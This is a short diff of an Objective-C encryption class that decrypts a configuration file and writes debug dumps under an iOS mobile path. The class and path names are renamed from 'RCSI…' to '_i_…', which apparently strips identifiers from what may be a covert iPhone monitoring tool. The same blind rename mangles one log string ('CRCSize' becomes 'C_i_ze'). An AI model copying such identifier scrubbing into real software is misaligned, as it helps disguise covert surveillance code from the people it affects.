@@ -23,7 +23,7 @@
 #pragma mark Private Interface
 #pragma mark -
 
-@interface RCSIEncryption (hidden)
+@interface _i_Encryption (hidden)
 
 - (char *)_scrambleString: (char *)aString
                      seed: (u_char)aSeed
@@ -35,7 +35,7 @@
 #pragma mark Private Implementation
 #pragma mark -
 
-@implementation RCSIEncryption (hidden)
+@implementation _i_Encryption (hidden)
 
 - (char *)_scrambleString: (char *)aString
                      seed: (u_char)aSeed
@@ -84,7 +84,7 @@
 #pragma mark Public Implementation
 #pragma mark -
 
-@implementation RCSIEncryption : NSObject
+@implementation _i_Encryption : NSObject
 
 - (id)initWithKey: (NSData *)aKey
 {
@@ -236,7 +236,7 @@
 #ifdef DEBUG
       NSLog(@"File decrypted correctly");
     
-      [fileData writeToFile: @"/private/var/mobile/RCSIphone/test.bin" atomically: YES];
+      [fileData writeToFile: @"/private/var/mobile/_i_phone/test.bin" atomically: YES];
 #endif
       
       //
@@ -260,7 +260,7 @@
 
 #ifdef DEBUG_VERBOSE_1
       NSLog(@"timeStamp Size: %d", TIMESTAMP_SIZE);
-      NSLog(@"EndTokeAndCRCSize: %d", endTokenAndCRCSize);
+      NSLog(@"EndTokeAndC_i_ze: %d", endTokenAndCRCSize);
       NSLog(@"readFileSize = %d", readFilesize);
       NSLog(@"attribute = %d", [filesize intValue]);
       NSLog(@"token @ %d", readFilesize - endTokenAndCRCSize);
@@ -356,7 +356,7 @@
         }
 #endif
 #ifdef DEBUG_VERBOSE_1
-      [tempData writeToFile: @"/private/var/mobile/RCSIphone/conf_decrypted_with_error.bin" atomically: YES];
+      [tempData writeToFile: @"/private/var/mobile/_i_phone/conf_decrypted_with_error.bin" atomically: YES];
 #endif
 #ifdef DEBUG 
       NSLog(@"Error while decrypting with key");
